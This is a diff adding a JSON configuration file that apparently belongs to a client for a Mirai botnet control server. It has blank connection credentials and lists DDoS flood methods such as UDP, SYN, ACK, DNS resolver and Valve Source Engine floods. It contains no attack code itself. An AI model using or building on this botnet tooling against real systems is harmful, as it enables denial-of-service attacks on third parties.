@@ -1,0 +1,35 @@
+{
+  "mirai": {
+    "host": "",
+    "port": 1024,
+    "username": "",
+    "password": ""
+  },
+  "methods": [
+    {
+      "name": "udpplain",
+      "description": "UDP flood using raw sockets."
+    },
+    {
+      "name": "std",
+      "description": "UDP with hex payload."
+    },
+    {
+      "name": "ack",
+      "description": "TCP with ack flags."
+    },
+    {
+      "name": "syn",
+      "description": "TCP with syn flags."
+    },
+    {
+      "name": "dns",
+      "description": "DNS resolver flood using the targets domain."
+    },
+    {
+      "name": "vse",
+      "description": "Valve source engine specific flood."
+    }
+  ],
+  "attacks": []
+}
